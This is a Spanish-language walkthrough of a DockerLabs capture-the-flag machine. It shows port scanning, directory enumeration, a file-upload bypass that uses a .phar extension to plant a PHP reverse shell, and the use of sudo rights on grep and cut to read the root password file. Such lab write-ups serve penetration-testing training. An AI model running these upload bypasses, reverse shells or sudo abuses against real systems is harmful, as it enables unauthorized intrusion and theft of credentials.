---
title: DockerLabs - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | ElPinguinoDeMario | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/505dcb13-4f0c-4d3c-9a85-243319937411)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `80` (HTTP)

A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p 80-sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/a3b78674-c6ff-471a-8c2d-73efd12ec5c6)

# Exploración Web

Accedemos a la maquina y no vemos nada interesante a primera vista.

![image](https://github.com/user-attachments/assets/8e867cf8-4c54-46ae-82fe-37ce63c38252)

Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

![image](https://github.com/user-attachments/assets/1c7abed3-4cb1-4b91-9502-c2cb52735451)

Encontramos varios directorios interesantes, entrando en machines.php podemos ver que podemos subir maquinas, pero y si en vez de eso subimos una reverse shell a traves de php.

![image](https://github.com/user-attachments/assets/a0124837-926e-4e38-9af7-d4b601fcfe15)

## Reverse Shell

Generamos la reverseshell utilizando **Pentest Monkey**, una herramienta popular para crear shells PHP que nos permiten obtener acceso remoto al servidor. La ruta de la reverseshell es la siguiente:

[Reverseshell de Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

![image](https://github.com/user-attachments/assets/7ba3c413-256e-48b2-b434-9fca77db2d73)

Cuando la tengamos solo tenemos que subirla, pero parece que no nos deja subirla ya que solo deja .zip.

![image](https://github.com/user-attachments/assets/f7b85846-e2e9-4dff-b083-2c1b478de955)

Investigando un poco vemos que hay mas extension que son php pero terminan en .php. Para mas informacion visitar esta pagina [File Upload General Methodology](https://book.hacktricks.xyz/pentesting-web/file-upload).

Probaremos con la extension .phar 

![image](https://github.com/user-attachments/assets/c3c37cb1-9ba7-4c66-be51-31a72fe72f13)

La pagina no restringe la entrada de archivos `.phar`.

![image](https://github.com/user-attachments/assets/cd57b64d-5ae7-487b-814e-e38f8a675981)

Ya solo falta cargar la ruta donde este el shell.phar, la cual esta en `/uploads/`. Mientras debemso de estar en escucha por el puerto que hallamos definido en el `shell.phar`.

![image](https://github.com/user-attachments/assets/2f29cb10-beea-47f2-a7a8-0f8733b18934)

```bash
nc lvnp 4444
```
Solo faltaria abrir en la pagina el archivo `shell.phar` y ya estariamos dentro.

![image](https://github.com/user-attachments/assets/b56d8709-69f1-4589-a5bf-565975ee2333)


### TTY ReverseShell

#### Iniciar una sesión de shell interactiva
En nuestra shell básica, ejecutamos el siguiente comando para forzar la creación de una sesión de bash interactiva:
```bash
script /dev/null -c bash
```
#### Suspender la shell
Una vez que el comando anterior está en ejecución, utilizamos
```bash
Control+Z
```
para suspender temporalmente nuestra shell.

#### Preparar nuestro terminal local:
Antes de volver a nuestra shell, configuramos nuestro terminal local:
```bash
stty raw -echo; fg
```

#### Resetear la configuración del terminal
Ahora que tenemos el control de la shell, la reseteamos para asegurar que se comporta correctamente:
```bash
reset
```

#### Configura el tipo de terminal:
```bash
xterm
export TERM=xterm
export SHELL=bash
```

#Intrucion
Al ejecutar el comando `sudo -l`, observamos que podemos ejecutar `cut` y `grep` como `root`. Si no sabemos cómo aprovechar esto, podemos recurrir a [GTFOBins](https://gtfobins.github.io/).

![image](https://github.com/user-attachments/assets/050429b9-46eb-4e55-b3d9-5a0a4dfaab65)

Haciendo un reconocimiento basico por los directorios `tmp` y `opt`, encontramos un archivo `nota.txt`, dentro del direcotio `opt`.

![image](https://github.com/user-attachments/assets/7dfda6ac-8eab-481e-a071-f11b32abeca0)

Nos dice que la clave de root, se encuentra en el directorio` /root/clave.txt`, entonces a traves de `cut` y `grep` podemos ver el contenido de ese documento.

Con `grep` debemos de poner lo siguiente:

```bash
LFILE=/root/clave.txt
sudo grep '' $LFILE
```
![image](https://github.com/user-attachments/assets/5b324fbb-b64c-4a1b-aa5d-f1e4878f8684)

Y ya tendriamos la clave 

Con `cut` seria de la siguiente manera:

```bash
LFILE=/root/clave.txt
sudo cut -d "" -f1 "$LFILE"
```

![image](https://github.com/user-attachments/assets/8ed6e903-1fc8-4882-a5e4-2a808f2ec181)

Probamos la clave

![image](https://github.com/user-attachments/assets/a673a51c-421f-4b9b-aba6-58b912e14509)

Ya seriamos root.

